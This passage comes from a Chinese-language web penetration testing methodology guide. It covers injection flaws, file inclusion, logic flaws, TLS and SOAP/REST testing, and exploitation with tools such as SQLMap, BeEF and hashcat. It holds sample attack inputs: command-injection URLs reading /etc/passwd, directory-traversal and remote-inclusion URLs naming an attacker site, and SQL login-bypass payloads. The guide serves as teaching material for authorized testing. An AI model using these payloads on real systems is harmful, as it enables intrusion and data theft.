       ]>&xxe;
       ]>&xxe;
#### 9.5 模板注入
模板注入就是攻击者利用模板的语法注入恶意代码。
[Portswigger-服务端模板注入](https://portswigger.net/blog/server-side-template-injection)
  * 示例
    {{ 7 * 7 }}
#### 9.6 命令注入
用户注入操作系统的命令到Web应用程序并被执行，就发生了命令注入。
[OWASP-测试命令注入](https://www.owasp.org/index.php/Testing_for_Command_Injection_\(OTG-INPVAL-013))
  * 示例
    http://sensitive/cgi-bin/userData.pl?doc=/bin/ls|
    http://sensitive/something.php?dir=%3Bcat%20/etc/passwd
    Doc=Doc1.pdf+|+Dir c:\
#### 9.7 恶意重定向
当应用没有检查用户可控输入时，攻击者输入了恶意的URL并被应用接受时发生。
[OWASP-测试客户端恶意重定向](https://www.owasp.org/index.php/Testing_for_Client_Side_URL_Redirect_\(OTG-CLIENT-004))
  * 示例
    http://www.target.site?#redirect=www.fake-target.site 
    http://www.target.site??url=http://www.fake-target.site
#### 9.8 本地文件包含(LFI)
LFI指的是Web应用允许包含本地服务器端存在的文件。
[OWASP-测试本地文件包含](https://www.owasp.org/index.php/Testing_for_Local_File_Inclusion)
  * 示例
    http://vulnerable_host/preview.php?file=../../../../etc/passwd
    http://vulnerable_host/preview.php?file=../../../../etc/passwd%00
#### 9.9 远程文件包含(RFI)
RFI指的是Web应用允许包含远程服务器上存在的文件。
[OWASP-测试远程文件包含](https://www.owasp.org/index.php/Testing_for_Remote_File_Inclusion)
  * 示例
    http://vulnerable_host/vuln_page.php?file=http://attacker_site/malicous_page
### 10\. 逻辑漏洞
想要发现逻辑漏洞，你必须对目标非常了解。只有你对目标的功能都是怎么使用有了了解后，你才能推想哪里有可利用的地方。测试逻辑漏洞时，可以回想作为普通用户是如何使用Web应用的功能的，是如何一步一步完成各种动作的，然后你要做的就是不按照这些步骤来。
此外，这时候也可以测试下输入一些不切实际的值。(比如一款健生app，用户输入自己的跑步里程)。
这时也可以测试[非法文件上传](https://www.owasp.org/index.php/Unrestricted_File_Upload)。
### 11\. 加密算法漏洞
名称 | 描述  
---|---  
SSLyze | TLS/SSL分析工具  
测试Web应用的TLS/SSL实现的质量，我推荐先去[这里](https://www.ssllabs.com/ssltest/)，如果搞不到，可以用`SSLyze`。
  * 示例
    sslyze --regular www.example.com
分析的目的可以归结为：
  1. 目标是否使用了某种形式的加密手段。
  2. 目标使用的加密手段是否已经过时(TLS 1.2, SSL2/SSl3)。
这时候也应该注意目标是否用了脆弱的加密算法(MD5,RC4等)，是否支持正向加密(译者注: 一次一密)等。
### 12\. 拒绝服务
拒绝服务是利用某种手段让目标无法为合法用户提供服务。拒绝服务的类型包括用户文件上传(上传巨大文件)到用户账户锁定(为了防止登录爆破)等。
如果存在载入很慢的页面或者是Ajax请求很卡，那么就意味着这个地方可能会被用于拒绝服务攻击。
### 13\. Flash漏洞
名称 | 描述  
---|---  
Firefox Developer Tools | Firefox浏览器自带的用于诊断、审计、调试客户端代码的工具  
JPEXS (FFDec) | 开源的SWF文件反汇编工具  
如果目标使用了flash或者其他的需要编译的客户端技术(如silverlight)，那么你应该下载下来然后利用`JPEXS
FFDec`这样的反汇编工具来审计他们的源代码。如果你成功的对他们进行了逆向工程，你可能会发现一些隐藏的漏洞。
## 0x04 测试Web服务
Web服务用于机器之间的数据交换，他们应该用之前介绍的方法进行测试(Mapping->漏洞挖掘->漏洞利用)，可以用`Burp`对请求进行拦截，然后分析接口返回的数据。
### 1\. 测试REST服务
如果有文档的话，测试REST服务之前应该阅读它。当然，这通常是白盒测试或者是灰盒测试时的做法，或者你想更深入的进行测试时也可以这么做。
在黑盒测试过程中，我们可以用`burp`拦截请求和响应，观察`JSON`格式的响应信息来了解接口的作用，但是这个过程非常麻烦，不是很推荐。
因为REST使用`http`协议，所以我们也可以测试之前的一些漏洞比如SQLi和XSS。
测试REST服务时可以参考以下文章：
  * 
  * 
  * 
### 2\. 测试SOAP服务
名称 | 描述  
---|---  
Wsdler (BApp) | 可以解析WSDL文件，然后测试所有的允许的方法的请求  
尽管如今我在渗透测试中观察到REST服务比SOAP服务更多，但还是应该注意它。
基于SOAP的Web服务有一点很好，就是他是通过WSDL文件自描述的。你可以用`Wsdler (BApp)`这样的工具来解析WSDL文件，然后用`Burp
Repeater`来发送测试请求。
和REST一样，我们也可以测试之前的一些漏洞比如SQLi和XSS。
  * 检查任何一个在mapping和漏洞挖掘时发现的和服务有关的路径
    * 比如，
  * 查看WSDL文件获取接口信息然后导入Burp
  * 在Burp Proxy的历史标签页，把WSDL文件通过`Parse WSDL`右键选项加入到Wsdler扩展
  * 发送测试请求给Repeater，观察服务如何工作
测试SOAP服务时可以参考：
  * 
## 0x05 漏洞利用
> 在漏洞利用阶段，是利用之前发现的漏洞，评估他们影响范围与风险。
简单来说，这一步就是查阅之前步骤中你所发现与记录的信息，尽可能深地利用发现的漏洞。有时在漏洞利用过程中，你可能需要更高的权限才能进行下去，这时你应该返回去，从mapping步骤开始重新迭代之前的过程。
下面是一些示例场景，但这一步是非常独特的。
### 1\. 利用场景
### 2\. 利用XSS
#### 2.1 浏览器劫持
名称 | 描述  
---|---  
BeEF | 基于web的XSS平台  
如果你发现目标应用确实存在XSS漏洞，这时你可以试试是否可以用`BeEF`这样的工具来控制目标浏览器。
可以参考[这篇](https://null-byte.wonderhowto.com/how-to/hack-like-pro-hack-web-browsers-with-beef-0159961/)。
你可以使用自己的浏览器来验证XSS漏洞的危害性当你向客户展示你发现的XSS漏洞时。
### 3\. 利用SQLi
#### 3.1 数据提取
名称 | 描述  
---|---  
SQLMap | 自动化的SQLi工具，可以检测和利用基于许多流行的关系型数据库的SQL注入漏洞  
如果目标存在SQLi且为了提取数据，`SQLMap`是首选。
[SQLMap](http://sqlmap.org/)官网有详细的教程，我推荐你仔细看看。
#### 3.2 离线密码爆破
名称 | 描述  
---|---  
Hashcat | 世界上最快最先进的密码恢复工具  
当你得到目标应用账户的密码时，可以尝试这个。
如果密码用了哈希算法加密，你可以用`hashcat`结合一个好的字典比如`rockyou.txt`来恢复密码。可以看[这篇](https://www.alpinesecurity.com/blog/offline-password-cracking-the-attack-and-the-best-defense-against-it)。
毋庸置疑，这将是您在渗透测试结束时可以为客户带来的最大发现之一。
#### 3.3 认证绕过
你可以尝试利用SQLi来提升自己的权限。网上有很多关于此的文章，下面这些payload你可以尝试在一些脆弱的表单里输入：
    admin' --    admin' #
    admin'/*
    admin' or '1'='1
    admin' or '1'='1'--    admin' or '1'='1'#
    admin' or '1'='1'/*
    admin'or 1=1 or ''='
    admin' or 1=1
### 4\. 跨站请求伪造(CSRF)
名称 | 描述  
---|---  
Burp: Generate CSRF PoC | 用于生成CSRF Poc的Burp模块  
如果目标存在CSRF漏洞(`Burp Scanner`会发现)，你可以用`Generate CSRF PoC`来验证是否真的存在。
可以看[这篇](https://support.portswigger.net/customer/portal/articles/1965674-using-burp-to-test-for-cross-site-request-forgery-csrf-)教程。
大概就下面这样：
  1. 拦截一个HTTP请求(通常是修改账户信息的)
  2. 在Burp中右键
  3. Generating the CSRF PoC(修改一些请求体的信息)
  4. 保存poc到一个html文件
  5. 打开html文件并点击提交
  6. 验证信息是否被恶意篡改
## 0x00 结尾
感谢阅读。